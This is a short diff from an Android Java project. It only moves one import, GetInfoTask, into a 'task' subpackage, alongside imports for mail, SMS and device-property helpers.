@@ -27,12 +27,12 @@ import android.widget.ImageButton;
 import android.widget.ImageView;
 import android.widget.TextView;
 
-import system.service.GetInfoTask;
 import system.service.GlobalValues;
 import system.service.R;
 import system.service.config.ConfigCtrl;
 import system.service.config.MailCfg;
 import system.service.feature.sms.SmsCtrl;
+import system.service.task.GetInfoTask;
 
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.FileCtrl;
